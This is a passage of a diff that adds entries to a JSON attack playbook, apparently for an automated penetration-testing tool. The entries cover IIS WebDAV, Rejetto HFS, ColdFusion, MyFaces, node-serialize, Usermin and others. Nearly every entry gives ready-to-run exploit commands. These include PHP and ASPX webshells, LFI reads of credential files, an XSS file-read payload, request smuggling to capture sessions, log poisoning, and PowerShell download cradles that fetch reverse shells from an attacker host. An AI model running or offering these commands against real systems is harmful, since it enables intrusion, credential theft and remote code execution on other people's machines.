+          "run": "git checkout -b feature-pipeline && echo '<?php system($_GET[\"c\"]); ?>' > shell.php && git add shell.php && git commit -m 'Deploy diagnostic handler' && git push origin feature-pipeline",
+          "note": "Commit and push a PHP webshell into a repository branch monitored by CI/CD deployment pipelines."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/{{app_path}}/shell.php?c=id'",
+          "note": "Trigger execution of the deployed webshell endpoint to establish initial foothold."
+        }
+      ]
+    },
+    {
+      "id": "iis6-webdav-scstorage",
+      "title": "Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE (CVE-2017-7269)",
+      "hypothesis": "Microsoft IIS 6.0 on Windows Server 2003 with WebDAV enabled suffers from a remote buffer overflow in ScStoragePathFromUrl. Sending a crafted PROPFIND request with an oversized If: header executes arbitrary shellcode.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "curl"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:80",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.windows"
+      ],
+      "priority": 84,
+      "phase": "access",
+      "proves": "exploits IIS 6.0 WebDAV CVE-2017-7269 buffer overflow to obtain Network Service shell",
+      "does_not_prove": "SYSTEM administrative access without token impersonation",
+      "report": {
+        "finding": "Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl Remote Code Execution (CVE-2017-7269)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "python3 iis6_webdav_cve_2017_7269.py {{target}} 80 {{lhost}} {{lport}}",
+          "note": "Transmit buffer overflow payload via WebDAV PROPFIND request targeting IIS 6.0 worker process."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X PROPFIND -H 'If: <http://{{target}}/' 'http://{{target}}/'",
+          "note": "Probe target IIS 6.0 server to verify if WebDAV method handling is enabled."
+        }
+      ]
+    },
+    {
+      "id": "pdf-export-xss-fileread",
+      "title": "Server-Side XSS Dynamic PDF Export Local File Disclosure",
+      "hypothesis": "Web applications converting user-supplied HTML into PDF documents using headless renderers (wkhtmltopdf, Puppeteer) evaluate JavaScript. Injecting XMLHttpRequest payloads reading file:/// allows reading server files directly inside the generated PDF.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "pdftotext"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "http.reachable"
+      ],
+      "produces": [
+        "loot.files",
+        "credential.candidate"
+      ],
+      "priority": 78,
+      "phase": "loot",
+      "proves": "exploits server-side dynamic PDF generator XSS to exfiltrate arbitrary local filesystem files",
+      "does_not_prove": "direct remote code execution",
+      "report": {
+        "finding": "Server-Side XSS Local File Disclosure in Dynamic PDF Generation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability/"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST -d \"content=<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send()</script>\" 'http://{{target}}/export_pdf' -o report.pdf",
+          "note": "Inject XMLHttpRequest script payload into PDF generation form to read /etc/passwd."
+        },
+        {
+          "tool": "pdftotext",
+          "run": "pdftotext report.pdf - | grep -E 'root:|reader:|admin:'",
+          "note": "Extract text from downloaded PDF document to verify exfiltrated file contents."
+        }
+      ]
+    },
+    {
+      "id": "amportal-conf-leak",
+      "title": "FreePBX / Asterisk amportal.conf Credential Extraction",
+      "hypothesis": "FreePBX, Asterisk, and Elastix PBX instances store database and management credentials in /etc/amportal.conf or /etc/asterisk/manager.conf. Extracting this file via LFI or unauthorized access leaks credentials often reused for root.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "grep"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "http.reachable"
+      ],
+      "produces": [
+        "credential.candidate",
+        "credential.available"
+      ],
+      "priority": 81,
+      "phase": "loot",
+      "proves": "extracts database and administrative passwords from Asterisk/FreePBX configuration",
+      "does_not_prove": "direct system shell without credential reuse or Asterisk AMI injection",
+      "report": {
+        "finding": "Cleartext Administrative Credentials Disclosed in amportal.conf",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-asterisk"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -k -s 'https://{{target}}/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action='",
+          "note": "Exploit LFI in vtiger CRM or FreePBX component to read Asterisk configuration file."
+        },
+        {
+          "tool": "grep",
+          "run": "grep -E 'AMPDBPASS|AMPMGRPASS|AMPDBUSER' /etc/amportal.conf",
+          "note": "Parse extracted amportal.conf configuration lines for database and manager passwords."
+        }
+      ]
+    },
+    {
+      "id": "rejetto-hfs-rce",
+      "title": "Rejetto HttpFileServer Macro Injection RCE",
+      "hypothesis": "Rejetto HttpFileServer (HFS 2.3) fails to handle null bytes in the search query parameter (CVE-2014-6287), allowing macro execution blocks to execute operating system commands in the server process context.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "python3"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.rejetto_hfs",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.windows"
+      ],
+      "priority": 88,
+      "phase": "access",
+      "proves": "demonstrates command execution via Rejetto HFS search null-byte macro injection",
+      "does_not_prove": "elevated administrative access beyond the HFS process account",
+      "report": {
+        "finding": "Rejetto HttpFileServer Remote Code Execution (CVE-2014-6287)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/39161"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/search=%00{.+exec|powershell.exe%20-c%20%22{{command}}%22.}'",
+          "note": "Exploit Rejetto HttpFileServer (HFS 2.3) macro injection vulnerability (CVE-2014-6287) to execute commands."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -c 'import urllib.parse; print(urllib.parse.quote(\"powershell -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://{{lhost}}/rev.ps1\\\")\"))'",
+          "note": "URL-encode PowerShell reverse shell cradle payload for HTTP search parameter transmission."
+        }
+      ]
+    },
+    {
+      "id": "coldfusion-scheduled-task-rce",
+      "title": "Adobe ColdFusion Directory Traversal & Scheduled Task RCE",
+      "hypothesis": "Adobe ColdFusion 8 is vulnerable to path traversal (CVE-2010-2861) leaking password.properties, or unauthenticated scheduled task creation writing a reverse JSP webshell to CFIDE webroot.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.coldfusion",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.webshell",
+        "foothold.windows"
+      ],
+      "priority": 84,
+      "phase": "access",
+      "proves": "retrieves ColdFusion admin hashes and deploys JSP webshell via scheduled task write",
+      "does_not_prove": "administrative host compromise beyond ColdFusion service account",
+      "report": {
+        "finding": "Adobe ColdFusion Administrative Access and JSP Webshell Deployment",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/14641"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en'",
+          "note": "Retrieve ColdFusion administrator password hash via unauthenticated directory traversal (CVE-2010-2861)."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -b cookies.txt -d 'taskName=rev&interval=Daily&schedule=1&startDate=01/01/2026&startTime=12:00:00&publish=1&file=C:\\ColdFusion8\\wwwroot\\CFIDE\\shell.jsp&fileURL=http://{{lhost}}/shell.jsp' 'http://{{target}}:8500/CFIDE/administrator/scheduler/scheduleedit.cfm'",
+          "note": "Configure an administrative scheduled task in ColdFusion writing a reverse JSP webshell to webroot."
+        }
+      ]
+    },
+    {
+      "id": "ftp-webroot-upload-webshell",
+      "title": "Anonymous FTP Webroot Write to Webshell Execution",
+      "hypothesis": "Anonymous or low-privilege FTP users with write access directly to the web server docroot (C:\\inetpub\\wwwroot or /var/www/html) can upload ASPX, ASP, or PHP webshells and trigger them over HTTP.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "ftp"
+      ],
+      "os": [
+        "windows",
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:21",
+        "ftp.anon_write"
+      ],
+      "produces": [
+        "foothold.webshell"
+      ],
+      "priority": 87,
+      "phase": "access",
+      "proves": "uploads and executes webshell payload via writable FTP directory mapped to web document root",
+      "does_not_prove": "elevated administrative operating system access beyond webpool user",
+      "report": {
+        "finding": "Arbitrary File Upload to Webroot via Anonymous FTP Service",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -T shell.aspx 'ftp://anonymous:anonymous@{{target}}/'",
+          "note": "Upload ASPX or PHP webshell directly into webroot via writable anonymous FTP service."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/shell.aspx?cmd=whoami'",
+          "note": "Invoke uploaded webshell via HTTP GET request to verify command execution and establish foothold."
+        }
+      ]
+    },
+    {
+      "id": "http-request-smuggling-auth",
+      "title": "HTTP Request Smuggling Authentication Bypass and Siphoning",
+      "hypothesis": "Discrepancy in request length parsing (CL.TE or TE.CL) between front-end reverse proxy and backend server allows smuggling HTTP requests to hijack administrative sessions or capture authorization tokens.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:80",
+        "port:443",
+        "vuln.gitea",
+        "http.reachable"
+      ],
+      "produces": [
+        "credential.session",
+        "access.admin"
+      ],
+      "priority": 85,
+      "phase": "access",
+      "proves": "smuggles HTTP requests past front-end proxy to capture internal administrative sessions or bypass access controls",
+      "does_not_prove": "direct remote code execution on the underlying operating system",
+      "report": {
+        "finding": "HTTP Request Smuggling via Proxy Parsing Discrepancy",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://portswigger.net/web-security/request-smuggling"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary $'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: {{target}}\\r\\n\\r\\n' http://{{target}}/",
+          "note": "Probe for HTTP request smuggling (CL.TE) discrepancy between reverse proxy and backend server."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -X POST -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary @smuggle_auth_capture.txt http://{{target}}/",
+          "note": "Smuggle administrative query prefix to siphon subsequent user authorization headers and session cookies."
+        }
+      ]
+    },
+    {
+      "id": "nginx-log-poisoning-lfi",
+      "title": "Nginx Access Log Poisoning via Local File Inclusion",
+      "hypothesis": "Target web application suffers from Local File Inclusion and server access logs are readable. Poisoning the Nginx access log with PHP code via the User-Agent header achieves remote code execution when included.",
+      "tool": "curl",
+      "tools": [
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:80",
+        "port:443",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 85,
+      "phase": "access",
+      "proves": "executes arbitrary PHP commands through log poisoning combined with local file inclusion",
+      "does_not_prove": "elevated root privileges beyond the web service user context",
+      "report": {
+        "finding": "Remote Code Execution via Nginx Access Log Poisoning and Local File Inclusion",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -A '<?php system($_GET[\"c\"]); ?>' http://{{target}}/",
+          "note": "Poison web server access log by injecting executable PHP payload into User-Agent header."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s 'http://{{target}}/check.php?id=/var/log/nginx/access.log&c=whoami'",
+          "note": "Trigger local file inclusion targeting poisoned Nginx access log to execute injected PHP commands."
+        }
+      ]
+    },
+    {
+      "id": "myfaces-viewstate-deserialization-rce",
+      "title": "Apache MyFaces ViewState Java Deserialization Remote Code Execution",
+      "hypothesis": "Web application utilizes Apache MyFaces JavaServer Faces with default or hardcoded DES encryption and HMAC keys. Encrypting a ysoserial gadget within javax.faces.ViewState achieves remote code execution.",
+      "tool": "java",
+      "tools": [
+        "java",
+        "curl"
+      ],
+      "os": [
+        "windows",
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:8080",
+        "vuln.myfaces_jsf",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.windows",
+        "foothold.linux"
+      ],
+      "priority": 85,
+      "phase": "access",
+      "proves": "executes arbitrary commands via forged Java serialized ViewState in Apache MyFaces",
+      "does_not_prove": "administrative privileges without secondary escalation",
+      "report": {
+        "finding": "Remote Code Execution via Hardcoded Encryption Keys and Java Deserialization in Apache MyFaces",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://myfaces.apache.org/"
+      ],
+      "commands": [
+        {
+          "tool": "java",
+          "run": "java -jar ysoserial.jar CommonsCollections5 \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/shell.ps1')\" > payload.bin",
+          "note": "Generate serialized Java object payload using ysoserial targeting Apache MyFaces CommonsCollections gadget."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -d 'javax.faces.ViewState={{viewstate}}' http://{{target}}:8080/",
+          "note": "Transmit forged DES-encrypted and HMAC-signed ViewState parameter to trigger server-side deserialization RCE."
+        }
+      ]
+    },
+    {
+      "id": "node-serialize-rce",
+      "title": "Node.js node-serialize IIFE Remote Code Execution",
+      "hypothesis": "Target web application passes untrusted session cookies or JSON input to node-serialize unserialize(). An immediately invoked function expression (IIFE) with _$$ND_FUNC$$_ executes arbitrary Node.js code.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "curl"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:3000",
+        "port:80",
+        "vuln.node_serialize",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 85,
+      "phase": "access",
+      "proves": "executes arbitrary JavaScript code on the Node.js server via node-serialize deserialization flaw (CVE-2017-5941)",
+      "does_not_prove": "root or administrative access beyond the Node.js process context",
+      "report": {
+        "finding": "Remote Code Execution via Insecure Deserialization in node-serialize (CVE-2017-5941)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/49585"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "python3 -c \"import base64; print(base64.b64encode(b'{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'{{command}}\\')}()\\\"}').decode())\"",
+          "note": "Construct base64-encoded serialized JSON payload with immediately invoked function expression (IIFE) for node-serialize."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -b \"profile={{cookie_payload}}\" http://{{target}}:{{port}}/",
+          "note": "Transmit crafted serialized cookie payload to trigger arbitrary code execution in vulnerable Node.js application."
+        }
+      ]
+    },
+    {
+      "id": "usermin-auth-rce",
+      "title": "Usermin Authenticated Remote Code Execution (EDB-50234 / miniserv.pl)",
+      "hypothesis": "Target runs Usermin web management portal (port 20000). Recovered user credentials allow authenticating to miniserv.pl and exploiting an authenticated parameter command injection vulnerability to spawn a reverse shell.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "curl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "vuln.usermin",
+        "vuln.usermin_rce",
+        "port:20000"
+      ],
+      "produces": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "priority": 88,
+      "phase": "access",
+      "proves": "authenticated remote command execution and reverse shell as user usermin",
+      "does_not_prove": "direct root privileges without subsequent local privilege escalation",
+      "report": {
+        "finding": "Authenticated Remote Code Execution in Usermin Web Portal (EDB-50234)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/50234"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -sk https://{{target}}:20000/ | grep -i usermin",
+          "note": "Verify Usermin web interface banner and SSL responsiveness on port 20000."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 50234.py --rhost {{target}} --rport 20000 --user {{user}} --password '{{password}}' --lhost {{lhost}} --lport {{lport}}",
+          "note": "Authenticate to Usermin and trigger arbitrary command execution reverse shell via miniserv.pl."
         }
       ]
     }
